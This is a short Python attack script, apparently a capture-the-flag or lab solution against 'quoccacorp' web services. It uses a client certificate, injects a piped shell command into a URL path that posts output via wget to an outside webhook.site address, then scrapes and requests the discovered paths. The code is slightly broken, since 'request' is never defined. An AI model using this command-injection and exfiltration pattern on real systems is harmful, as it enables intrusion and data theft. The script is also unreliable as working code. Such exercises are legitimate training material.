import re
from urllib.parse import quote

import requests

s = requests.session()
# Tell requests to use the certificate.
s.cert = "../HamishWHC.pem"

# Send a GET request to whoami.

cmd = "| wget --post-file - https://webhook.site/20fc7217-9a7f-4f2a-886f-131539ede6de"
r = s.post(
    f"https://haas-v5.quoccacorp.com/{quote(cmd)}",
    data={"requestBox": request.format(path="/simple")},
)
# print(r.content.decode())

matches = re.findall(r"simple/[a-z-]+", r.content.decode())


for match in matches:
    r = s.post(
        "https://haas-v1.quoccacorp.com",
        data={"requestBox": request.format(path="/" + match)},
    )
    print(r.content)
